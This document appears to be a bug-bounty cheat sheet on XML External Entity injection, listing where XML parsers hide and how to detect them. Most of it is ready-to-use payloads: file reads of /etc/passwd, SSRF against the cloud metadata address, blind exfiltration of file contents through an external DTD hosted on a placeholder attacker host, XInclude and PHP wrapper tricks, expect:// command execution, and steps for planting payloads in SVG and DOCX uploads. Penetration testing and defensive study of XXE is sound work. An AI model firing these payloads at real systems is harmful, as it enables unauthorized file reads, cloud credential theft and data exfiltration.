# XML External Entity (XXE)

**TL;DR**: an XML parser processes your external entities → file read, SSRF, sometimes RCE/DoS. Look for any endpoint that eats XML (even hidden: SOAP, SAML, SVG, OOXML, RSS, sitemap, config import).

## Where to look
- `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
- Disguised XML formats: **SVG** (upload/avatar), **DOCX/XLSX/PPTX** (OOXML = zip of XML), **SAML** (SSO), RSS/Atom, sitemap, `.xml` config import, XML-RPC, **a JSON endpoint that also accepts XML** (switch the Content-Type!).
- Signal: an XML field whose value comes back in the response (for in-band XXE).

## Detection
- Inject a benign internal entity: `<!DOCTYPE r [<!ENTITY x "VALUE">]>` + `&x;` → if `VALUE` comes back, entities are processed.
- Parser errors on `<!DOCTYPE` = candidate.

## Payloads
**Classic file read (in-band)**:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><name>&xxe;</name></root>
```
**SSRF**: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` → `SSRF.md`.

**Blind → OOB (exfiltration via external DTD)**:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://attacker/evil.dtd"> %ext;]>
<r>&exfil;</r>
```
`evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval; %exfil;
```
**Error-based** (no outbound HTTP): trigger an error that includes the file content (malformed DTD referencing `%file;`).

**PHP wrapper (base64 for files with XML-breaking chars)**:
`php://filter/convert.base64-encode/resource=/etc/passwd`.

## Variants / bypass
- **Parameter entities** (`%`) required when general entities are blocked in the internal DTD.
- **UTF-16 / encoding** to bypass a keyword filter (`<!DOCTYPE`).
- **XInclude** (when you do not control the DOCTYPE but a sub-element):
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- **SVG XXE**: `<svg><image xlink:href="..."/>` or a DOCTYPE in the uploaded SVG.
- **DOCX/XLSX**: unzip, inject the DTD into `word/document.xml` or `[Content_Types].xml`, re-zip.
- **SOAP/SAML**: inject in the body; SAML → sometimes signature bypass on top.

## DoS (do NOT run in BB unless authorized)
- **Billion laughs** / entity expansion → DoS. Mention only.

## RCE (specific context)
- PHP with `expect` module: `expect://id`.
- Java with jar/certain libs: more complex chains.

## Impact
- Secret/file read = High. SSRF metadata → creds = Critical. RCE if conditions met.

## Caido
- Replay: switch a JSON endpoint's Content-Type to XML, inject the DOCTYPE. Blind → host the DTD, listen for OOB (collaborator/interactsh).

## References
- PortSwigger - XXE - https://portswigger.net/web-security/xxe
- PortSwigger - Blind XXE - https://portswigger.net/web-security/xxe/blind
- PayloadsAllTheThings - XXE - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- OWASP - XXE Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- OWASP WSTG - Testing for XML Injection - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- HackTricks - XXE - https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html
- YesWeHack guide - XXE - https://www.yeswehack.com/learn-bug-bounty/xml-external-entity-guide-xxe
